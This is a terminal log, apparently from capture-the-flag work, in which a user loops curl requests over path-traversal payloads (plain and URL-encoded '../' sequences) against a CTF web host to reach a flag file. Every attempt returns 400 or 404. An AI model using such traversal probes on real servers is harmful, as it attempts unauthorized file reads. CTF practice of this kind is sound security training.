@@ -1,0 +1,366 @@
+                                                                                                                      
+┌──(xhackerip㉿xkali)-[/tmp/koutammakou]
+└─$ for path in \
+  "/uploads/..%2fflag" \
+  "/uploads/%2e%2e%2fflag" \
+  "/uploads/%2e%2e%2fflag.txt" \
+  "/uploads/%2e%2e%2fapp%2fflag.txt" \
+  "/uploads/%2e%2e/%2e%2e/flag" \
+  "/uploads/cb88a130b59749b6a891dc7c9a49a17d/../../flag"; do
+    echo "========== $path =========="
+    curl --path-as-is -sS -i "$URL$path" | head -c 800
+    echo
+done
+========== /uploads/..%2fflag ==========
+La commande « head » est disponible aux emplacements suivants
+La commande « curl » est disponible aux emplacements suivants
+ * /bin/head
+ * /bin/curl
+ * /usr/bin/head
+ * /usr/bin/curl
+La commande n'a pas pu être trouvée car « /usr/bin:/bin » n'est pas incluse dans la variable d'environnement PATH.
+La commande n'a pas pu être trouvée car « /usr/bin:/bin » n'est pas incluse dans la variable d'environnement PATH.
+head : commande introuvable
+curl : commande introuvable
+
+========== /uploads/%2e%2e%2fflag ==========
+La commande « curl » est disponible aux emplacements suivants
+ * /bin/curl
+ * /usr/bin/curl
+La commande n'a pas pu être trouvée car « /bin:/usr/bin » n'est pas incluse dans la variable d'environnement PATH.
+curl : commande introuvable
+La commande « head » est disponible aux emplacements suivants
+ * /bin/head
+ * /usr/bin/head
+La commande n'a pas pu être trouvée car « /usr/bin:/bin » n'est pas incluse dans la variable d'environnement PATH.
+head : commande introuvable
+
+========== /uploads/%2e%2e%2fflag.txt ==========
+La commande « curl » est disponible aux emplacements suivants
+ * /bin/curl
+ * /usr/bin/curl
+La commande n'a pas pu être trouvée car « /bin:/usr/bin » n'est pas incluse dans la variable d'environnement PATH.
+curl : commande introuvable
+La commande « head » est disponible aux emplacements suivants
+ * /bin/head
+ * /usr/bin/head
+La commande n'a pas pu être trouvée car « /usr/bin:/bin » n'est pas incluse dans la variable d'environnement PATH.
+head : commande introuvable
+
+========== /uploads/%2e%2e%2fapp%2fflag.txt ==========
+La commande « curl » est disponible aux emplacements suivants
+ * /bin/curl
+ * /usr/bin/curl
+La commande n'a pas pu être trouvée car « /bin:/usr/bin » n'est pas incluse dans la variable d'environnement PATH.
+curl : commande introuvable
+La commande « head » est disponible aux emplacements suivants
+ * /bin/head
+ * /usr/bin/head
+La commande n'a pas pu être trouvée car « /bin:/usr/bin » n'est pas incluse dans la variable d'environnement PATH.
+head : commande introuvable
+
+========== /uploads/%2e%2e/%2e%2e/flag ==========
+La commande « head » est disponible aux emplacements suivants
+ * /bin/head
+ * /usr/bin/head
+La commande n'a pas pu être trouvée car « /bin:/usr/bin » n'est pas incluse dans la variable d'environnement PATH.
+head : commande introuvable
+La commande « curl » est disponible aux emplacements suivants
+ * /bin/curl
+ * /usr/bin/curl
+La commande n'a pas pu être trouvée car « /usr/bin:/bin » n'est pas incluse dans la variable d'environnement PATH.
+curl : commande introuvable
+
+========== /uploads/cb88a130b59749b6a891dc7c9a49a17d/../../flag ==========
+La commande « head » est disponible aux emplacements suivants
+ * /bin/head
+ * /usr/bin/head
+La commande n'a pas pu être trouvée car « /bin:/usr/bin » n'est pas incluse dans la variable d'environnement PATH.
+head : commande introuvable
+La commande « curl » est disponible aux emplacements suivants
+ * /bin/curl
+ * /usr/bin/curl
+La commande n'a pas pu être trouvée car « /usr/bin:/bin » n'est pas incluse dans la variable d'environnement PATH.
+curl : commande introuvable
+
+                                                                                                                      
+┌──(xhackerip㉿xkali)-[/tmp/koutammakou]
+└─$ 
+┌──(xhackerip㉿xkali)-[/tmp/koutammakou]
+└─$ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+rehash
+                                                                                                                      
+┌──(xhackerip㉿xkali)-[/tmp/koutammakou]
+└─$ export URL="https://v2vvjuadx2dxbpgf.t.ctf.tg"
+
+for p in \
+  "/uploads/../../flag" \
+  "/uploads/../../flag.txt" \
+  "/uploads/../../app/flag.txt" \
+  "/uploads/..%2fflag" \
+  "/uploads/%2e%2e%2fflag" \
+  "/uploads/%2e%2e%2fflag.txt" \
+  "/uploads/%2e%2e%2fapp%2fflag.txt" \
+  "/uploads/cb88a130b59749b6a891dc7c9a49a17d/../../flag"; do
+
+  echo "========== $p =========="
+  curl --path-as-is -sS -i "$URL$p" | head -c 1000
+  echo
+done
+========== /uploads/../../flag ==========
+HTTP/2 400 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:56 GMT
+content-type: text/html
+content-length: 157
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx/1.27.5</center>
+</body>
+</html>
+
+========== /uploads/../../flag.txt ==========
+HTTP/2 400 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:57 GMT
+content-type: text/html
+content-length: 157
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx/1.27.5</center>
+</body>
+</html>
+
+========== /uploads/../../app/flag.txt ==========
+HTTP/2 400 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:57 GMT
+content-type: text/html
+content-length: 157
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx/1.27.5</center>
+</body>
+</html>
+
+========== /uploads/..%2fflag ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:58 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/%2e%2e%2fflag ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:58 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/%2e%2e%2fflag.txt ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:58 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/%2e%2e%2fapp%2fflag.txt ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:59 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/cb88a130b59749b6a891dc7c9a49a17d/../../flag ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:40:59 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+                                                                                                                      
+┌──(xhackerip㉿xkali)-[/tmp/koutammakou]
+└─$ export URL="https://v2vvjuadx2dxbpgf.t.ctf.tg"
+
+for p in \
+  "/uploads/../../flag" \
+  "/uploads/../../flag.txt" \
+  "/uploads/../../app/flag.txt" \
+  "/uploads/..%2fflag" \
+  "/uploads/%2e%2e%2fflag" \
+  "/uploads/%2e%2e%2fflag.txt" \
+  "/uploads/%2e%2e%2fapp%2fflag.txt" \
+  "/uploads/cb88a130b59749b6a891dc7c9a49a17d/../../flag"; do
+
+  echo "========== $p =========="
+  curl --path-as-is -sS -i "$URL$p" | head -c 1000
+  echo
+done
+========== /uploads/../../flag ==========
+HTTP/2 400 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:07 GMT
+content-type: text/html
+content-length: 157
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx/1.27.5</center>
+</body>
+</html>
+
+========== /uploads/../../flag.txt ==========
+HTTP/2 400 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:07 GMT
+content-type: text/html
+content-length: 157
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx/1.27.5</center>
+</body>
+</html>
+
+========== /uploads/../../app/flag.txt ==========
+HTTP/2 400 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:07 GMT
+content-type: text/html
+content-length: 157
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx/1.27.5</center>
+</body>
+</html>
+
+========== /uploads/..%2fflag ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:08 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/%2e%2e%2fflag ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:08 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/%2e%2e%2fflag.txt ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:09 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/%2e%2e%2fapp%2fflag.txt ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:09 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+========== /uploads/cb88a130b59749b6a891dc7c9a49a17d/../../flag ==========
+HTTP/2 404 
+server: nginx/1.27.5
+date: Sat, 07 Nov 2026 14:41:09 GMT
+content-type: text/html; charset=utf-8
+content-length: 207
+x-robots-tag: noai, noimageai, noindex, nofollow
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+                                                                                                                      
+┌──(xhackerip㉿xkali)-[/tmp/koutammakou]
+└─$ 
